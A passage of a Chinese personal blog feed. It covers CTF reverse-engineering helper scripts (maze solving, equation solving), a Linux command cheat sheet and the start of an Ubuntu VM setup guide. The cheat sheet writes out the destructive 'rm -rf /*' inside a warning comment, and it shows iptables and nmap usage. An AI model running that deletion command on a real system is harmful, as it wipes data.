punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往右走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'d'</span>  <span class="token comment"># 向右走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往左走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'a'</span>  <span class="token comment"># 向左走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    dfs<span class="token punctuation">(</span>sti<span class="token punctuation">,</span> stj<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="生成迷宫"><a href="#生成迷宫" class="headerlink" title="生成迷宫"></a>生成迷宫</h1><h2 id="Python-版-7"><a href="#Python-版-7" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li><em>用于辅助走迷宫脚本</em>，快速生成迷宫的二维列表形式的数据</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存放生成的迷宫，是一个二维列表</span>maze_line <span class="token operator">=</span> <span class="token number">16</span>  <span class="token comment"># 迷宫的行数</span>maze_column <span class="token operator">=</span> <span class="token number">16</span>  <span class="token comment"># 迷宫的列数</span><span class="token comment"># 迷宫数据</span>maze_str <span class="token operator">=</span> <span class="token string">"1111111111111111100000111111011110111011111101111011101100010111101110110101011110111000010101111011111101010111101111110001011110111111101101111011111110110111100001100001000111110111101101011111011110110101100001111011010010111111100001111011111111111111"</span>  <span class="token comment"># maze_tmp 用来暂存每一行的迷宫数据，一维列表</span>maze_tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> i <span class="token operator">%</span> maze_column <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        maze<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maze_tmp<span class="token punctuation">)</span>  <span class="token comment"># 每 maze_column 个数据作为一组，加入 maze</span>        maze_tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 一组加入完后，需要将 maze_tmp 置空，用于存放下一组数据</span>    maze_tmp <span class="token operator">+=</span> maze_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>maze_str<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 最后一行数据，直接加入maze即可</span>        maze<span class="token punctuation">.</span>append<span class="token punctuation">(</span>maze_tmp<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>maze_line<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 输出迷宫</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h1><h2 id="Python-版-8"><a href="#Python-版-8" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li>可求解 n 元 n 次方程组</li><li>无法判断无解的情况（会取近似值），但是可以从解出来的结果判断是否无解（无解的情况解出来的值是很长很长的不循环小数）</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 创建未知数  </span>v<span class="token punctuation">,</span> w<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">'v w x y z'</span><span class="token punctuation">)</span>  <span class="token comment"># 定义方程组  </span>eq1 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">23</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">32</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">98</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">55</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">333322</span><span class="token punctuation">)</span>  eq2 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">123</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">322</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">68</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">67</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">707724</span><span class="token punctuation">)</span>  eq3 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">266</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">34</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">43</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">1272529</span><span class="token punctuation">)</span>  eq4 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">343</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">352</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">65</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1672457</span><span class="token punctuation">)</span>  eq5 <span class="token operator">=</span> Eq<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">231</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">321</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">938</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">555</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">970</span><span class="token punctuation">,</span> <span class="token number">3372367</span><span class="token punctuation">)</span>  <span class="token comment"># 解方程组  </span>sol <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">(</span>eq1<span class="token punctuation">,</span> eq2<span class="token punctuation">,</span> eq3<span class="token punctuation">,</span> eq4<span class="token punctuation">,</span> eq5<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v<span class="token punctuation">,</span> w<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打印解  </span><span class="token keyword">print</span><span class="token punctuation">(</span>sol<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基本操作命令</title>
      <link href="/posts/820f7148.html"/>
      <url>/posts/820f7148.html</url>
      
        <content type="html"><![CDATA[<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><p>一个点（<code>./</code>），代表本级目录  </p><p>两个点（<code>../</code>），代表上级目录</p><p>两个上级目录（<code>../../</code>），代表上上级目录</p><hr><h1 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="转到盘符-x2F-目录"><a href="#转到盘符-x2F-目录" class="headerlink" title="转到盘符&#x2F;目录"></a>转到盘符&#x2F;目录</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> 路径名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Windows 下转到 E 盘：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> E:  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><hr><h1 id="显示目录中的文件"><a href="#显示目录中的文件" class="headerlink" title="显示目录中的文件"></a>显示目录中的文件</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 仅显示可见文件</span><span class="token function">ls</span> 目录名<span class="token comment"># 显示所有文件，包括隐藏文件</span><span class="token function">ls</span> <span class="token parameter variable">-a</span><span class="token comment"># 显示详细信息</span>ll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> 文件名1 文件名2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li>文件被命名为 <code>.</code> 开头时，如 <code>.flag</code>，则 <code>flag</code> 为隐藏文件，<code>ls</code> 无法查看，需用 <code>ls -a</code> 才可以看到  </li><li>将隐藏文件重命名去掉开头的 <code>.</code> 时，文件恢复可见</li></ol></blockquote><hr><h1 id="编辑文档"><a href="#编辑文档" class="headerlink" title="编辑文档"></a>编辑文档</h1><p>使用 vim 编辑：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> 文件名<span class="token comment"># 用法：</span><span class="token comment"># i（进入编辑模式）  </span><span class="token comment"># esc（退出编辑模式）  </span><span class="token comment"># :q（退出，但不保存）  </span><span class="token comment"># :wq（保存并退出）  </span><span class="token comment"># esc + u（撤销之前的操作）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用 gedit 编辑（如果没有需自行安装）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装 gedit</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gedit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gedit 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="给文件增加权限"><a href="#给文件增加权限" class="headerlink" title="给文件增加权限"></a>给文件增加权限</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 增加执行权限</span><span class="token function">sudo</span> <span class="token function">chmod</span> a+x 文件名<span class="token comment"># 增加 775 权限</span><span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">775</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">权限</th><th align="left">数值</th></tr></thead><tbody><tr><td align="left">读取权限 R</td><td align="left">4</td></tr><tr><td align="left">写入权限 W</td><td align="left">2</td></tr><tr><td align="left">执行权限 X</td><td align="left">1</td></tr></tbody></table><blockquote><p>775 权限中的三位数字分别对应：拥有者、组用户、其他用户</p><ul><li>拥有者，拥有可读可写可执行权限：7 &#x3D; 4 + 2 + 1</li><li>组用户，拥有可读可写可执行权限：7 &#x3D; 4 + 2 + 1</li><li>其他用户，拥有可读可执行权限，但没有写入权限：5 &#x3D; 4 + 1</li></ul></blockquote><hr><h1 id="运行-ELF-可执行文件"><a href="#运行-ELF-可执行文件" class="headerlink" title="运行 ELF 可执行文件"></a>运行 ELF 可执行文件</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./可执行文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想在终端直接输入命令来打开可执行文件，而不需要考虑可执行文件所在路径，例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">可执行文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要创建软连接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token string">"可执行文件的路径"</span> /usr/bin/名称   <span class="token comment"># 这里的 “名称” 可以随意取</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在终端通过如下命令即可直接打开可执行文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="运行-python-代码"><a href="#运行-python-代码" class="headerlink" title="运行 python 代码"></a>运行 python 代码</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用默认 python 版本</span>python py文件名<span class="token comment"># 指定 python 版本</span>python3 py文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="编译-C-代码并运行"><a href="#编译-C-代码并运行" class="headerlink" title="编译 C 代码并运行"></a>编译 C 代码并运行</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 编译</span>gcc c文件名 <span class="token parameter variable">-o</span> 编译生成的文件名<span class="token comment"># 运行</span>./编译生成的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="复制文件-x2F-文件夹"><a href="#复制文件-x2F-文件夹" class="headerlink" title="复制文件&#x2F;文件夹"></a>复制文件&#x2F;文件夹</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 复制文件</span><span class="token function">cp</span> 源文件 复制到文件/文件夹<span class="token comment"># 复制文件夹</span><span class="token function">cp</span> <span class="token parameter variable">-r</span> 源文件夹路径 复制到文件/文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="移动、重命名文件-x2F-文件夹"><a href="#移动、重命名文件-x2F-文件夹" class="headerlink" title="移动、重命名文件&#x2F;文件夹"></a>移动、重命名文件&#x2F;文件夹</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 移动</span><span class="token function">mv</span> 源文件/源文件夹路径 移动后的文件/文件夹路径<span class="token comment"># 重命名</span><span class="token function">mv</span> 源文件名 修改后的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="卸载-apt-安装的软件"><a href="#卸载-apt-安装的软件" class="headerlink" title="卸载 apt 安装的软件"></a>卸载 apt 安装的软件</h1><ol><li><code>--purge</code> 是可选项，这个属性是将软件及其配置文件一并删除</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove 包名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>如果不需要删除配置文件，则不加 <code>--purge</code> 选项</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> remove 包名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="deb-软件包的安装和卸载"><a href="#deb-软件包的安装和卸载" class="headerlink" title="deb 软件包的安装和卸载"></a>deb 软件包的安装和卸载</h1><blockquote><p>除了一些 Github 上的工具，大部分软件都是需要自己安装的 deb 包，例如：搜狗输入法 Linux 版</p></blockquote><p>安装 deb 软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> deb文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>卸载 deb 软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看已安装的软件</span><span class="token function">sudo</span> dpkg <span class="token parameter variable">-l</span><span class="token comment"># 指定要卸载的软件，软件名严格按照 sudo dpkg -l 输出的软件名称</span><span class="token function">sudo</span> dpkg <span class="token parameter variable">-r</span> 软件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="删除文件-x2F-文件夹"><a href="#删除文件-x2F-文件夹" class="headerlink" title="删除文件&#x2F;文件夹"></a>删除文件&#x2F;文件夹</h1><blockquote><p><strong>除非比较熟悉，否则删除命令尽量不要在 <code>sudo</code> 管理员权限下使用</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除一个空目录</span><span class="token function">rm</span> <span class="token parameter variable">-d</span> 目录名<span class="token comment"># 删除一个非空目录</span><span class="token function">rm</span> <span class="token parameter variable">-r</span> 目录名<span class="token comment"># 删除文件</span><span class="token function">rm</span> 文件名<span class="token comment"># 删除当前目录下的所有内容</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> *   <span class="token comment"># 千万千万不要手欠在 * 前面加 /，例如：rm -rf /*，如果在管理员权限下使用会导致系统崩溃！！！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> zxvf 压缩包 <span class="token parameter variable">-C</span> 解压到指定目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="修改-host-并清除-DNS-缓存"><a href="#修改-host-并清除-DNS-缓存" class="headerlink" title="修改 host 并清除 DNS 缓存"></a>修改 host 并清除 DNS 缓存</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts<span class="token comment"># 检查目前的缓存大小</span>resolvectl statistics<span class="token comment"># 清理缓存，清理完后 Current Cache Size 变为 0</span>resolvectl flush-caches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><ol><li>关闭端口的防火墙，以 tcp 5000 端口为例</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">5000</span> <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检测是否成功，通过 nmap 扫描该设备 IP 的 5000 端口，假设 IP 为 192.168.148.152：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-p</span> <span class="token number">5000</span> <span class="token number">192.168</span>.148.152<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>未关闭防火墙时：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PORT     STATE    SERVICE<span class="token number">5000</span>/tcp filtered upnp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果关闭成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PORT     STATE SERVICE<span class="token number">5000</span>/tcp <span class="token function">open</span>  upnp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>列出当前防火墙规则</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-L</span> <span class="token parameter variable">-n</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> Linux环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu22.04虚拟机环境搭建</title>
      <link href="/posts/226aff2b.html"/>
      <url>/posts/226aff2b.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>安装软件或 <code>git</code> 仓库到本地时，建议在路径 <code>/opt</code> 下安装或存放，养成文件管理的习惯  </p><p>另外，apt 安装时建议使用新的 <code>sudo apt install xxx</code> 代替旧的 <code>sudo apt-get install xxx</code></p></blockquote><p>使用 pip 安装库时，<code>pip install xxx</code> 和 <code>sudo pip install xxx</code> 安装的库路径不一样，例如：</p><ul><li><code>sudo pip install xxx</code> 安装路径：<code>/usr/local/lib/python3.10/dist-packages/</code></li><li><code>pip install xxx</code> 安装路径：<code>/home/wyy/.local/lib/python3.10/site-packages/</code></li></ul><p><strong>尽量不要使用 <code>sudo pip install</code> 来安装 python 库</strong></p><hr><p><mark>如果搭建 Ubuntu 16.04 这种旧版本的环境，请移步：《<a href="Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Ubuntu16.04虚拟机环境搭建</a>》</mark></p><hr><p>以下所有的安装都基于 Ubuntu 22.04 和 Kali 2022.4 虚拟机进行了测试，其他版本的 Ubuntu 和 Kali 虚拟机应该也大同小异，但是版本比较旧的系统可能差异会比较大，需要自己斟酌一下</p><blockquote><p><strong>不算 tips 的小 tips：</strong></p><ol><li><em>VM 虚拟机挂起后再保存快照可以秒存，但开机运行状态保存快照相当慢（开机运行状态保存快照中途是可以继续操作虚拟机的，不影快照的保存）</em></li><li>如果发现在虚拟机中，鼠标的额外功能键无法使用，比如：前进、后退等<br>在虚拟机文件夹下，有一个 <code>xxx.vmx</code> 的文件，在虚拟机关闭的条件下，使用记事本打开，在文件的最后添加如下内容，重新开启虚拟机，即可<em>使用鼠标的额外功能键</em>：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mouse.vusb.enable <span class="token operator">=</span> <span class="token string">"TRUE"</span>  mouse.vusb.useBasicMouse <span class="token operator">=</span> <span class="token string">"FALSE"</span>  usb.generic.allowHID <span class="token operator">=</span> <span class="token string">"TRUE"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>如果遇到终端的光标消失的问题（我在分屏 GDB 调试时经常遇到其中一个终端不显示光标），使用如下命令解决：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\033">\033</span>[?25h"</span> <span class="token comment"># 显示光标  </span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\033">\033</span>[?25l"</span> <span class="token comment"># 隐藏光标</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol></blockquote><hr><h1 id="VMtools"><a href="#VMtools" class="headerlink" title="VMtools"></a>VMtools</h1><blockquote><p>为了避免麻烦，建议直接使用开源的 <code>Open VM Tools</code> 替代 VMware 官方的 <code>VMware Tools</code><br><code>Open VM Tools</code> 比较新，几乎不存在冲突，且安装相当方便</p></blockquote><p><strong>像 Ubuntu16.04 这种旧版本还是建议使用 VMware 官方的 <code>VMware Tools</code></strong></p><h2 id="安装和卸载-VMware-Tools"><a href="#安装和卸载-VMware-Tools" class="headerlink" title="安装和卸载 VMware Tools"></a>安装和卸载 VMware Tools</h2><blockquote><p>如果你已经安装了 <code>VMware Tools</code>，可以输入如下命令卸载</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装，将VMtools解压到一个目录下，例如主目录</span><span class="token builtin class-name">cd</span> ~/vmware-tools-distrib<span class="token function">sudo</span> ./vmware-install.pl<span class="token comment"># 卸载</span><span class="token function">sudo</span> vmware-uninstall-tools.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-Open-VM-Tools"><a href="#安装-Open-VM-Tools" class="headerlink" title="安装 Open VM Tools"></a>安装 Open VM Tools</h2><blockquote><p>安装 <code>VMware Tools</code> 经常会出现兼容性不好，系统之间复制文件失灵等问题，建议安装 <code>Open VM Tools</code></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 更新系统软件包</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token comment"># 安装 Open VM Tools</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> open-vm-tools-desktop<span class="token comment"># 如果要卸载 Open VM Tools，或者想换回 VMware Tools 之前需要先卸载这个</span><span class="token function">sudo</span> <span class="token function">apt-get</span> autoremove open-vm-tools <span class="token parameter variable">--purge</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="更换镜像源"><a href="#更换镜像源" class="headerlink" title="更换镜像源"></a>更换镜像源</h1><blockquote><p>Linux 自带的源来自国外，有时候下载速度感人，十分难受，建议换成清华镜像</p><p>其他版本可查询清华镜像源官网：<br><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">ubuntu | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a><br><a href="https://mirrors.tuna.tsinghua.edu.cn/help/kali/">kali | 